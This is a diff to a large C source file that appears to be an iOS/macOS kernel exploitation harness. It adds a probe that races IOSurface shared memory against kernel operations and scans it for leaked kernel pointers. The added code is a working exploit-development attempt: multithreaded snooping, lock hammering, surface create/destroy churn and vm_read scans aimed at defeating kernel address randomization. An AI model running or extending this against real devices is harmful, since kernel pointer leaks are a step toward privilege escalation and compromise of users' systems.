@@ -16572,6 +16572,288 @@ static void *r419_race_reader(void *arg) {
  * C. Pipe buffer spray adjacent to IOSurface properties.
  */
 
+/*
+ * r424: Shared data race + kernel pointer snoop.
+ *
+ * Key finding from r423: IOSurface shared data at +8 is mapped at the
+ * SAME virtual address in both user and kernel space. The kernel reads
+ * and writes to this memory during IOSurface operations.
+ *
+ * Vectors:
+ * A. Race condition: continuously read shared data while another thread
+ *    triggers kernel operations on the surface. During kernel execution,
+ *    kernel pointers may be temporarily stored in the shared data.
+ * B. Lock contention: Lock the surface from userspace, then trigger kernel
+ *    operations that need the lock. The kernel may write its wait channel
+ *    or mutex pointer into the shared data.
+ * C. Full shared data scan at different offsets (0-512) looking for
+ *    transient kernel pointers during rapid create/destroy cycles.
+ * D. IOSurface CopyAllValues — the kernel serializes properties into
+ *    the shared data, which may temporarily contain kernel heap pointers.
+ */
+
+struct r424_ctx {
+    volatile int running;
+    volatile uint64_t *shared_base;
+    volatile int found;
+    uint64_t found_addr;
+    int found_offset;
+    IOSurfaceRef surf;
+};
+
+static void *r424_snoop_thread(void *arg) {
+    struct r424_ctx *ctx = (struct r424_ctx *)arg;
+    uint64_t kptrs[64];
+    int kcount = 0;
+
+    while (ctx->running && kcount < 64) {
+        /* Scan shared data for kernel pointers */
+        for (int off = 0; off < 256; off += 8) {
+            uint64_t v;
+            memcpy(&v, (void *)((uintptr_t)ctx->shared_base + off), 8);
+            /* Check for kernel pointer range (0xFFFFFFF0xxxxxxxx+)
+               but exclude known values */
+            if ((v >> 36) == 0xFFFFFFF &&
+                v != 0xFFFFFFFFFFFFFFFF &&
+                (v & 0xFFF) == 0) { /* page-aligned kernel addr */
+                int dup = 0;
+                for (int i = 0; i < kcount; i++) {
+                    if (kptrs[i] == v) { dup = 1; break; }
+                }
+                if (!dup && kcount < 64) {
+                    kptrs[kcount++] = v;
+                    if (!ctx->found) {
+                        ctx->found = 1;
+                        ctx->found_addr = v;
+                        ctx->found_offset = off;
+                    }
+                }
+            }
+        }
+    }
+    return (void *)(uintptr_t)kcount;
+}
+
+static void r424_probe(void) {
+    rlog("\n=== r424: Shared Data Race + Kernel Pointer Snoop ===\n\n");
+    fflush(stdout);
+
+    unsigned pixFmt = 'BGRA';
+    const void *kk[] = {
+        kIOSurfaceWidth, kIOSurfaceHeight,
+        kIOSurfaceBytesPerRow, kIOSurfacePixelFormat,
+        kIOSurfaceAllocSize
+    };
+    int w = 64, h = 64, bpr = 256, as = 16384;
+    CFNumberRef vv[] = {
+        CFNumberCreate(NULL, kCFNumberIntType, &w),
+        CFNumberCreate(NULL, kCFNumberIntType, &h),
+        CFNumberCreate(NULL, kCFNumberIntType, &bpr),
+        CFNumberCreate(NULL, kCFNumberIntType, &pixFmt),
+        CFNumberCreate(NULL, kCFNumberIntType, &as)
+    };
+    CFDictionaryRef sprops = CFDictionaryCreate(NULL, kk,
+        (const void**)vv, 5,
+        &kCFTypeDictionaryKeyCallBacks,
+        &kCFTypeDictionaryValueCallBacks);
+
+    /* ---- Vector A: Race during SetValue/RemoveValue ---- */
+    rlog("  Vector A: Snoop shared data during Set/Remove operations\n");
+    {
+        IOSurfaceRef surf = IOSurfaceCreate(sprops);
+        uint64_t clientRef = (uint64_t)surf;
+        uint64_t sharedPtr;
+        memcpy(&sharedPtr, (void *)(clientRef + 8), 8);
+        rlog("    Surface id=%u shared=0x%llx\n",
+            IOSurfaceGetID(surf), (unsigned long long)sharedPtr);
+
+        struct r424_ctx ctx;
+        ctx.running = 1;
+        ctx.shared_base = (volatile uint64_t *)sharedPtr;
+        ctx.found = 0;
+        ctx.found_addr = 0;
+        ctx.found_offset = 0;
+        ctx.surf = surf;
+
+        pthread_t snooper;
+        pthread_create(&snooper, NULL, r424_snoop_thread, &ctx);
+
+        /* Hammer kernel with SetValue/RemoveValue while snooper reads */
+        CFStringRef key = CFSTR("race_key");
+        uint8_t data[256];
+        memset(data, 0xAA, sizeof(data));
+        CFDataRef val = CFDataCreate(NULL, data, sizeof(data));
+
+        for (int i = 0; i < 50000 && !ctx.found; i++) {
+            IOSurfaceSetValue(surf, key, val);
+            IOSurfaceRemoveValue(surf, key);
+        }
+
+        ctx.running = 0;
+        void *retval;
+        pthread_join(snooper, &retval);
+        int kcount = (int)(uintptr_t)retval;
+
+        if (ctx.found) {
+            rlog("    *** FOUND kernel ptr at +%d: 0x%016llx ***\n",
+                ctx.found_offset, (unsigned long long)ctx.found_addr);
+            rlog("    Total unique kernel ptrs seen: %d\n", kcount);
+        } else {
+            rlog("    No kernel pointers caught (%d unique)\n", kcount);
+        }
+
+        CFRelease(val);
+        CFRelease(surf);
+    }
+    fflush(stdout);
+
+    /* ---- Vector B: Snoop during Lock/Unlock ---- */
+    rlog("\n  Vector B: Snoop shared data during Lock/Unlock\n");
+    {
+        IOSurfaceRef surf = IOSurfaceCreate(sprops);
+        uint64_t clientRef = (uint64_t)surf;
+        uint64_t sharedPtr;
+        memcpy(&sharedPtr, (void *)(clientRef + 8), 8);
+
+        struct r424_ctx ctx;
+        ctx.running = 1;
+        ctx.shared_base = (volatile uint64_t *)sharedPtr;
+        ctx.found = 0;
+        ctx.found_addr = 0;
+        ctx.found_offset = 0;
+        ctx.surf = surf;
+
+        pthread_t snooper;
+        pthread_create(&snooper, NULL, r424_snoop_thread, &ctx);
+
+        for (int i = 0; i < 50000 && !ctx.found; i++) {
+            IOSurfaceLock(surf, 0, NULL);
+            IOSurfaceUnlock(surf, 0, NULL);
+        }
+
+        ctx.running = 0;
+        void *retval;
+        pthread_join(snooper, &retval);
+        int kcount = (int)(uintptr_t)retval;
+
+        if (ctx.found) {
+            rlog("    *** FOUND kernel ptr at +%d: 0x%016llx ***\n",
+                ctx.found_offset, (unsigned long long)ctx.found_addr);
+        } else {
+            rlog("    No kernel pointers caught (%d unique)\n", kcount);
+        }
+
+        CFRelease(surf);
+    }
+    fflush(stdout);
+
+    /* ---- Vector C: Snoop during rapid create/destroy ---- */
+    rlog("\n  Vector C: Snoop shared data during create/destroy cycles\n");
+    {
+        /* Create a persistent surface to snoop on */
+        IOSurfaceRef snoop_surf = IOSurfaceCreate(sprops);
+        uint64_t clientRef = (uint64_t)snoop_surf;
+        uint64_t sharedPtr;
+        memcpy(&sharedPtr, (void *)(clientRef + 8), 8);
+
+        struct r424_ctx ctx;
+        ctx.running = 1;
+        ctx.shared_base = (volatile uint64_t *)sharedPtr;
+        ctx.found = 0;
+        ctx.found_addr = 0;
+        ctx.found_offset = 0;
+        ctx.surf = snoop_surf;
+
+        pthread_t snooper;
+        pthread_create(&snooper, NULL, r424_snoop_thread, &ctx);
+
+        /* Rapidly create and destroy surfaces to cause kernel heap churn */
+        for (int i = 0; i < 5000 && !ctx.found; i++) {
+            IOSurfaceRef tmp = IOSurfaceCreate(sprops);
+            CFRelease(tmp);
+        }
+
+        ctx.running = 0;
+        void *retval;
+        pthread_join(snooper, &retval);
+        int kcount = (int)(uintptr_t)retval;
+
+        if (ctx.found) {
+            rlog("    *** FOUND kernel ptr at +%d: 0x%016llx ***\n",
+                ctx.found_offset, (unsigned long long)ctx.found_addr);
+        } else {
+            rlog("    No kernel pointers caught (%d unique)\n", kcount);
+        }
+
+        CFRelease(snoop_surf);
+    }
+    fflush(stdout);
+
+    /* ---- Vector D: Extended shared data scan (0-512 bytes) ---- */
+    rlog("\n  Vector D: Extended shared data scan (0-512 bytes)\n");
+    {
+        IOSurfaceRef surf = IOSurfaceCreate(sprops);
+        uint64_t clientRef = (uint64_t)surf;
+        uint64_t sharedPtr;
+        memcpy(&sharedPtr, (void *)(clientRef + 8), 8);
+
+        /* Set some properties to populate kernel-side structures */
+        for (int i = 0; i < 20; i++) {
+            char ks[32];
+            snprintf(ks, sizeof(ks), "prop_%d", i);
+            CFStringRef k = CFStringCreateWithCString(NULL, ks,
+                kCFStringEncodingASCII);
+            int val = i * 1000;
+            CFNumberRef n = CFNumberCreate(NULL, kCFNumberIntType, &val);
+            IOSurfaceSetValue(surf, k, n);
+            CFRelease(k);
+            CFRelease(n);
+        }
+
+        /* Lock the surface to populate lock-related fields */
+        IOSurfaceLock(surf, 0, NULL);
+
+        /* Read a wider range of the shared data */
+        int kernelFound = 0;
+        rlog("    After Lock + 20 properties:\n");
+
+        /* Use vm_read to safely read up to 1 page from shared ptr */
+        vm_offset_t data = 0;
+        mach_msg_type_number_t dataCnt = 0;
+        kern_return_t kr = vm_read(mach_task_self(),
+            (vm_address_t)sharedPtr, 512, &data, &dataCnt);
+        if (kr == KERN_SUCCESS) {
+            uint64_t *ptr = (uint64_t *)data;
+            for (int off = 0; off < (int)dataCnt && off < 512; off += 8) {
+                uint64_t v = ptr[off / 8];
+                if (v != 0) {
+                    int isKernel = ((v >> 36) == 0xFFFFFFF);
+                    if (isKernel || off >= 160) {
+                        rlog("      +%3d: 0x%016llx%s\n", off,
+                            (unsigned long long)v,
+                            isKernel ? " *** KERNEL ***" : "");
+                        if (isKernel) kernelFound++;
+                    }
+                }
+            }
+            vm_deallocate(mach_task_self(), data, dataCnt);
+        }
+
+        IOSurfaceUnlock(surf, 0, NULL);
+        if (!kernelFound)
+            rlog("    No kernel pointers in extended scan\n");
+
+        CFRelease(surf);
+    }
+    fflush(stdout);
+
+    CFRelease(sprops);
+    for (int i = 0; i < 5; i++) CFRelease(vv[i]);
+
+    rlog("\n=== r424 complete ===\n");
+    fflush(stdout);
+}
+
 static void r423_probe(void) {
     rlog("\n=== r423: Kernel Info Leak Multi-Vector ===\n\n");
     fflush(stdout);
@@ -72204,9 +72486,16 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 427) {
+            rlog("*** rounds=427: Shared Data Race + Kernel Snoop ***\n");
+            rlog("  Race shared data during kernel ops to catch kernel ptrs.\n\n");
+            fflush(stdout);
+            r424_probe();
+            goto done;
+        }
         if (rounds == 426) {
-            rlog("*** rounds=426: Heap Kernel Pointer Leak ***\n");
-            rlog("  Property spray + free + realloc, OOL port spray.\n\n");
+            rlog("*** rounds=426: Kernel Info Leak Multi-Vector ***\n");
+            rlog("  task_info, thread_info, shared data integrity, backing store.\n\n");
             fflush(stdout);
             r423_probe();
             goto done;
@@ -74778,7 +75067,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
